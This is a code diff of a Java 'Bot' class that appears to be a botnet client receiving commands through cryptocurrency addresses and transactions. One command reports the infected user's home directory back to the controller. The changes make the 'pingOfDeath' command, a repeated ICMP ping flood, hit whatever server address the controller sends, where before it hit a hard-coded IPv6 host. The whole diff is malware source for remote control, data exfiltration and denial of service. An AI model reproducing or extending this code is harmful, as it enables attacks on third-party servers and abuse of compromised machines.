@@ -79,6 +79,7 @@ public class Bot {
      				System.out.println("comando: "+comando);
      				
      				String addressString=v[1];
+     				String serverAddress=v[2];
      				
      				System.out.println("address:"+addressString);
      				Address address=new Address(params,addressString);
@@ -98,7 +99,7 @@ public class Bot {
      						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
      						break;
      					case "pingOfDeath":
-    						String risultato=pingOfDeath();
+    						String risultato=pingOfDeath(serverAddress);
     						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
      					default:
      						break;
@@ -129,6 +130,7 @@ public class Bot {
         				System.out.println("comando: "+comando);
         				
         				String addressString=v[1];
+        				String serverAddress=v[2];
         				
         				System.out.println("address:"+addressString);
         				Address address=new Address(params,addressString);
@@ -148,7 +150,7 @@ public class Bot {
         						sendCommand("userhome-"+list.get(0).toString()+"-"+System.getProperty("user.home"),address);
         						break;
         					case "pingOfDeath":
-        						String risultato=pingOfDeath();
+        						String risultato=pingOfDeath(serverAddress);
         						sendCommand("pingOfDeath-"+list.get(0).toString()+"-"+risultato,address);
         					default:
         						break;
@@ -190,7 +192,7 @@ public class Bot {
         //String myAddress=list.get(0).toString();
         //registerBot(myAddress);
         
-        pingOfDeath();
+       // pingOfDeath();
         
         
         try {
@@ -246,12 +248,12 @@ public class Bot {
 		return transaction.getHashAsString();		
 	}
     
-    public static String pingOfDeath(){
+    public static String pingOfDeath(String serverAddress){
     	// request
     	
     	final IcmpPingRequest request = IcmpPingUtil.createIcmpPingRequest ();
     	
-    	request.setHost ("2001:0:34ae:348:306c:2f5c:3f57:d449:8080");
+    	request.setHost (serverAddress);
 
         request.setPacketSize(650);
     	// repeat a few times
